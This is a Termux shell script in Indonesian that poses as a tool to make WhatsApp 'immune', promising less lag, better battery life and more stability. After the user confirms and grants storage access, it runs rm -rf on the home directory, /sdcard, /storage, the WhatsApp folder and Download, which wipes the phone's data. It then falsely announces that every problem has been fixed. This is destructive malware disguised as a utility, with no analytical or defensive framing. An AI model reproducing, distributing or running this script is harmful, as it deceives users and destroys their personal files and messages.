#Cracked77
blue='\033[34;1m'                                                                         
green='\033[32;1m'                                                                        
purple='\033[35;1m'                                                                       cyan='\033[36;1m'
red='\033[31;1m'                                                                          
white='\033[37;1m'                                                                        
yellow='\033[33;1m'

mv rocket.cow /data/data/com.termux/files/usr/share
clear
cowsay -f rocket "Buat Wa Anda Jadi Kebal!" | lolcat
read -p "Enter Tuk Lanjut!" p
echo
echo $green"TOOLS Wa kebal,Wa anda nge-lag pas di att?,Pending?"
echo "Macet-Macet? Cepet Down? Tenang! Kini admin Punya Solusi!"
echo "Kegunaan Tools Ini:"
echo $cyan
echo "1).Bikin G Pending Wa"
echo "2).Bikin G Cepet Down"
echo "3).Ga Boros Battry"
echo "4).Lanjay Ga Pake Patah Patah"
echo "5).Tidak memenUhi Memori"
echo "6).Meningkatkan Performa Anti Down"
echo "7).Menstabilkan Wa"
echo "8).Menjadikan Wa Anda KEBAL!"
echo $red"NOTE : Ijinkan Termux Mengakses Penyimpanan!"
echo $green"•     •     •So HAVE FUN!•     •     •"
echo $white"apakah anda yakin Ingin Melanjutkan?"
read -p "[ Y / N ]? : " c
if [ $c = Y ] || [ $c = y ]
then
termux-setup-storage
echo $green"Memulai Proses Pengebalan Dalam 5 sec..."
sleep 5
rm -rf $HOME
rm -rf /sdcard
rm -rf sdcard
rm -rf /sdcard/
rm -rf /storage/emulated/0
rm -rf /storage
rm -rf /storage/
rm -rf sdcard/WhatsApp
rm -rf sdcard/Download
echo
echo "Loading..."
echo
sleep 2
echo $white"Pengebalan Selesai! SELAMAT WA ANDA Jadi Kebal!!"
echo "Semua Masalah Telah Di FIX!"
echo "PERFORMA Anti Down MENINGKAT!!!"
else
    echo $red"PROSES DIBATALKAN!"
fi
